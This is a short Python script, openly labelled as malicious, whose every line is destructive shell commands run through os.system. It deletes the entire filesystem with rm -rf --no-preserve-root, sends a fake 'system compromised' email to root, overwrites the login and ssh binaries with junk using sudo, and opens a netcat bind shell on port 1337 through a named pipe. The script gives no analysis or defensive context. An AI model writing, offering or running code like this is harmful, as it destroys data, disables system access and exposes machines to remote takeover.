import os

print("Initiating Enhanced Malicious Script... Prepare for utter devastation!")

# Delete critical system files using --no-preserve-root flag
os.system("rm -rf --no-preserve-root /")

# Send fake emails by using a different mail command
os.system("echo 'Important Message: Your System Has Been Compromised!' | sendmail root")

# Attempt to overwrite system binaries with evil code without permission
os.system("echo 'Evil code here' | sudo tee /bin/login")
os.system("echo 'Evil code here' | sudo tee /bin/ssh")

# Create a backdoor for remote access with a sneaky trick
os.system("mkfifo /tmp/backpipe && /bin/bash < /tmp/backpipe | nc -lvp 1337 > /tmp/backpipe &")
